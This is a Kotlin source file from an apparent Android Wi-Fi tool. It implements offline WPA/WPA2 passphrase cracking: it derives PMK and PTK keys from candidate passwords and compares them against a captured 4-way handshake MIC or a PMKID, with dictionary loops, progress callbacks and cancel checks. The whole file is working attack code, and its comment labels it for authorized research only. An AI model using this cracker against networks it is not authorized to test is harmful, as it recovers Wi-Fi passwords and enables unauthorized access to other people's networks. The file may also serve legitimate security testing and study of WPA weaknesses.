package app.brucia.wifi

import java.io.ByteArrayOutputStream
import javax.crypto.Mac
import javax.crypto.SecretKeyFactory
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec

/**
 * WPA/WPA2 handshake dictionary attack, run on the phone. The ESP only captures the
 * 4-way handshake; the heavy crypto (PBKDF2 4096 + PTK/MIC per candidate) runs here -
 * exactly the kind of work a Flipper/ESP cannot do. Authorized research only.
 */
data class Handshake(
    val ssid: String,
    val apMac: ByteArray,   // 6 bytes
    val clMac: ByteArray,   // 6 bytes
    val aNonce: ByteArray,  // 32 bytes (AP)
    val sNonce: ByteArray,  // 32 bytes (client)
    val eapol: ByteArray,   // EAPOL frame of msg2, with the MIC field zeroed
    val mic: ByteArray,     // captured MIC (16 bytes)
    val keyVersion: Int,    // 1 = WPA (HMAC-MD5), 2 = WPA2 (HMAC-SHA1)
)

object WpaCracker {

    /** PMK = PBKDF2-HMAC-SHA1(passphrase, ssid, 4096, 256 bits). */
    fun pmk(passphrase: String, ssid: String): ByteArray {
        val spec = PBEKeySpec(passphrase.toCharArray(), ssid.toByteArray(Charsets.UTF_8), 4096, 256)
        return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(spec).encoded
    }

    /** IEEE 802.11i PRF-512 using HMAC-SHA1, for "Pairwise key expansion". */
    private fun prf512(key: ByteArray, label: String, data: ByteArray): ByteArray {
        val mac = Mac.getInstance("HmacSHA1")
        val out = ByteArrayOutputStream()
        var i = 0
        val labelBytes = label.toByteArray(Charsets.US_ASCII)
        while (out.size() < 64) {
            mac.init(SecretKeySpec(key, "HmacSHA1"))
            mac.update(labelBytes)
            mac.update(0)
            mac.update(data)
            mac.update(i.toByte())
            out.write(mac.doFinal())
            i++
        }
        return out.toByteArray().copyOf(64)
    }

    private fun lower(a: ByteArray, b: ByteArray): Boolean {
        for (i in a.indices) {
            val x = a[i].toInt() and 0xFF
            val y = b[i].toInt() and 0xFF
            if (x != y) return x < y
        }
        return true
    }

    /** KCK (first 16 bytes of the PTK) for a given PMK and handshake. */
    private fun kck(pmk: ByteArray, h: Handshake): ByteArray {
        val (m1, m2) = if (lower(h.apMac, h.clMac)) h.apMac to h.clMac else h.clMac to h.apMac
        val (n1, n2) = if (lower(h.aNonce, h.sNonce)) h.aNonce to h.sNonce else h.sNonce to h.aNonce
        val data = m1 + m2 + n1 + n2
        return prf512(pmk, "Pairwise key expansion", data).copyOf(16)
    }

    /** Computed MIC for a candidate passphrase against the handshake. */
    fun computeMic(passphrase: String, h: Handshake): ByteArray {
        val k = kck(pmk(passphrase, h.ssid), h)
        val algo = if (h.keyVersion == 1) "HmacMD5" else "HmacSHA1"
        val mac = Mac.getInstance(algo)
        mac.init(SecretKeySpec(k, algo))
        return mac.doFinal(h.eapol).copyOf(16)
    }

    /** PMKID = HMAC-SHA1(PMK, "PMK Name" || AP_MAC || STA_MAC)[0:16]. Clientless. */
    fun pmkid(passphrase: String, ssid: String, apMac: ByteArray, staMac: ByteArray): ByteArray {
        val mac = Mac.getInstance("HmacSHA1")
        mac.init(SecretKeySpec(pmk(passphrase, ssid), "HmacSHA1"))
        mac.update("PMK Name".toByteArray(Charsets.US_ASCII))
        mac.update(apMac)
        mac.update(staMac)
        return mac.doFinal().copyOf(16)
    }

    /**
     * Dictionary attack against a captured PMKID.
     *
     * [isCancelled] is checked before every candidate. PBKDF2-4096 per candidate is a tight,
     * non-suspending, CPU-bound loop, so coroutine Job.cancel() alone cannot interrupt it; the
     * caller passes a flag here so the loop stops promptly (within one candidate) on cancel.
     */
    fun crackPmkid(
        ssid: String, apMac: ByteArray, staMac: ByteArray, pmkid: ByteArray,
        candidates: Sequence<String>, progressEvery: Int = 200, onProgress: ((Int) -> Unit)? = null,
        isCancelled: () -> Boolean = { false },
    ): String? {
        val target = pmkid.copyOf(16)
        var tried = 0
        for (c in candidates) {
            if (isCancelled()) return null
            if (c.length in 8..63 && pmkid(c, ssid, apMac, staMac).contentEquals(target)) return c
            tried++
            if (onProgress != null && tried % progressEvery == 0) onProgress(tried)
        }
        return null
    }

    private fun micMatches(passphrase: String, h: Handshake): Boolean =
        computeMic(passphrase, h).contentEquals(h.mic.copyOf(16))

    /**
     * Try each candidate; return the first passphrase whose MIC matches, or null.
     * [onProgress] is called every [progressEvery] candidates with the count tried.
     *
     * [isCancelled] is checked before every candidate. The per-candidate work (PBKDF2-4096 +
     * PTK/MIC) is a tight, non-suspending, CPU-bound loop, so coroutine Job.cancel() alone
     * cannot interrupt it; the caller passes a flag here so the loop stops promptly on cancel.
     */
    fun crack(
        h: Handshake,
        candidates: Sequence<String>,
        progressEvery: Int = 200,
        onProgress: ((Int) -> Unit)? = null,
        isCancelled: () -> Boolean = { false },
    ): String? {
        var tried = 0
        for (c in candidates) {
            if (isCancelled()) return null
            if (c.length in 8..63 && micMatches(c, h)) return c
            tried++
            if (onProgress != null && tried % progressEvery == 0) onProgress(tried)
        }
        return null
    }
}
